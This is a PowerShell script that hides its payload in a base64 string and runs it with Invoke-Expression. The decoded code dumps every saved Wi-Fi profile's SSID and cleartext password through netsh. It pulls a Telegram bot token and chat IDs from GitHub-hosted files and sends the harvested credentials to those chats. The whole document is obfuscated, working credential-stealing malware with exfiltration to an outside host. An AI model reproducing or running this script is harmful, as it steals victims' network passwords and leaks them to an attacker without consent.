$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyA9ICdObyBzZSBlbmN1ZW50cmEgZWwgcGVyZmlsJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgID0gJ05vbWJyZSBkZSBTU0lEJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgID0gJ0NvbnRlbmlkbyBkZSBsYSBjbGF2ZScNCiAgICAgICAgfQ0KICAgICAgICAnZW4tRU4nID0gQHsNCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyA9ICdQcm9maWxlIG5vdCBmb3VuZCcNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICA9ICdTU0lEIG5hbWUnDQogICAgICAgICAgICAna2V5X3RleHQnICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIEdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICBpZiAoJGlucHV0VGV4dCAtbWF0Y2ggIlxiJG5hbWVTdHJpbmdcYiIpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsIiIgLXJlcGxhY2UgJ1xzKiQnDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KDQogICAgJFByb2ZpbGVzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBHZXRWYWx1ZUJ5TmFtZSAkXyAkTEFOR1snc3NpZF9uYW1lX3RleHQnXQ0KICAgIH0NCg0KICAgICRXTEFOX1Byb2ZpbGVzID0gQCgpDQoNCiAgICAkUHJvZmlsZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICR3bGFuX1Byb2ZpbGUgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSAkXyBrZXk9Y2xlYXINCg0KICAgICAgICBpZiAoJHdsYW5fUHJvZmlsZSAtY29udGFpbnMgJExBTkdbJ3Byb2ZpbGVfbm90X2ZvdW5kX3RleHQnXSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCg0KICAgICAgICAkSW50ZXJmYWNlTmFtZSA9IEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ3NzaWRfbmFtZV90ZXh0J10NCg0KICAgICAgICBpZiAoJEludGVyZmFjZU5hbWUpIHsNCiAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gJEludGVyZmFjZU5hbWUuVHJpbSgnIicpDQoNCiAgICAgICAgICAgICMgQ29ycmVnaXIgY2FyYWN0ZXJlcyBlc3BlY2lhbGVzIHNpIGVzIG5lY2VzYXJpbw0KICAgICAgICAgICAgJEludGVyZmFjZU5hbWUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpHZXRFbmNvZGluZygiSVNPLTg4NTktMSIpLkdldEJ5dGVzKCRJbnRlcmZhY2VOYW1lKSkNCg0KICAgICAgICAgICAgJEtleSA9IEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ2tleV90ZXh0J10NCg0KICAgICAgICAgICAgaWYgKCRLZXkpIHsNCiAgICAgICAgICAgICAgICAkV0xBTl9Qcm9maWxlcyArPSBbUFNDdXN0b21PYmplY3RdQHsNCiAgICAgICAgICAgICAgICAgICAgU1NJRCA9ICRJbnRlcmZhY2VOYW1lDQogICAgICAgICAgICAgICAgICAgIEtleSAgPSAkS2V5DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRXTEFOX1Byb2ZpbGVzLkNvdW50IC1ndCAwKSB7DQogICAgICAgICMgRW52aWFyIGxhIGluZm9ybWFjacOzbiBhIFRlbGVncmFtDQogICAgICAgICRyZXN1bHRNZXNzYWdlID0gIlRvdGFsIFdMQU5fUHJvZmlsZXM6ICQoJFdMQU5fUHJvZmlsZXMuQ291bnQpYHJgblBhc3N3b3JkIFdpRmkgZW5jb250cmFkYXM6YHJgbiINCg0KICAgICAgICAkV0xBTl9Qcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJgcmBuU1NJRDogJCgkXy5TU0lEKWByYG5QYXNzd29yZDogJCgkXy5LZXkpYHJgbiINCiAgICAgICAgfQ0KDQogICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJgcmBuQXV0b3I6IEx1aXNoae+/vW8gUGVyaWNlbmFgcmBuTWFzIGluZm9ybWFjaW9uOiBbQmxvZ10oaHR0cHM6Ly9scGVyaWNlbmEuYmxvZ3Nwb3QuY29tLylgcmBuSVA6YHJgbiINCg0KICAgICAgICByZXR1cm4gJHJlc3VsdE1lc3NhZ2UNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gJ05vIHNlIGVuY29udHJhcm9uIHBlcmZpbGVzIFdMQU4uJw0KICAgIH0NCn0NCg0KIyBGdW5jdGlvbiB0byBzZW5kIGEgbWVzc2FnZSB0byBUZWxlZ3JhbQ0KZnVuY3Rpb24gU2VuZC1UZWxlZ3JhbU1lc3NhZ2Ugew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdG9rZW4sDQogICAgICAgIFtzdHJpbmddJGNoYXRJZCwNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCg0KICAgICR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR0b2tlbi9zZW5kTWVzc2FnZSINCg0KICAgICMgRGl2aWRpciBlbCBtZW5zYWplIGVuIHBhcnRlcyBtw6FzIHBlcXVlw7FhcyAocG9yIGVqZW1wbG8sIGNhZGEgNDA5NiBjYXJhY3RlcmVzKQ0KICAgICRtZXNzYWdlUGFydHMgPSBbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddXTo6bmV3KCkNCiAgICAkbWF4TWVzc2FnZUxlbmd0aCA9IDQwOTYNCg0KICAgIHdoaWxlICgkbWVzc2FnZS5MZW5ndGggLWd0ICRtYXhNZXNzYWdlTGVuZ3RoKSB7DQogICAgICAgICRtZXNzYWdlUGFydHMuQWRkKCRtZXNzYWdlLlN1YnN0cmluZygwLCAkbWF4TWVzc2FnZUxlbmd0aCkpDQogICAgICAgICRtZXNzYWdlID0gJG1lc3NhZ2UuU3Vic3RyaW5nKCRtYXhNZXNzYWdlTGVuZ3RoKQ0KICAgIH0NCiAgICAkbWVzc2FnZVBhcnRzLkFkZCgkbWVzc2FnZSkNCg0KICAgIGZvcmVhY2ggKCRwYXJ0IGluICRtZXNzYWdlUGFydHMpIHsNCiAgICAgICAgJHBhcmFtcyA9IEB7DQogICAgICAgICAgICBjaGF0X2lkID0gJGNoYXRJZA0KICAgICAgICAgICAgdGV4dCAgICA9ICRwYXJ0DQogICAgICAgIH0NCg0KICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLU1ldGhvZCBQb3N0IC1Cb2R5ICRwYXJhbXMNCiAgICB9DQp9DQoNCiMgVGVsZWdyYW0gY29uZmlndXJhdGlvbg0KJHRva2VuQ29uZmlnID0gSW52b2tlLVJlc3RNZXRob2QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL2NvbmZpZzIudHh0Ig0KJGNoYXRJZHMgPSBJbnZva2UtUmVzdE1ldGhvZCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BlcmljZW5hL2hhcHB5YmlydGhkYXkuZ2l0aHViLmlvL21haW4vZGF0b3MvdXN1YXJpby9sdWlzaGluby50eHQiDQoNCiMgUnVuIHRoZSBHZXQtV0xBTl9Qcm9maWxlcyBmdW5jdGlvbiBhbmQgc3RvcmUgdGhlIHJlc3VsdA0KJHJlc3VsdCA9IEdldC1XTEFOX1Byb2ZpbGVzDQoNCiMgU2VuZCB0aGUgcmVzdWx0IGFzIGEgbWVzc2FnZSB0byBlYWNoIGNoYXQgSUQNCmZvcmVhY2ggKCRjaGF0SWQgaW4gJGNoYXRJZHMpIHsNCiAgICBTZW5kLVRlbGVncmFtTWVzc2FnZSAtdG9rZW4gJHRva2VuQ29uZmlnIC1jaGF0SWQgJGNoYXRJZCAtbWVzc2FnZSAkcmVzdWx0DQp9DQoNCg=='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
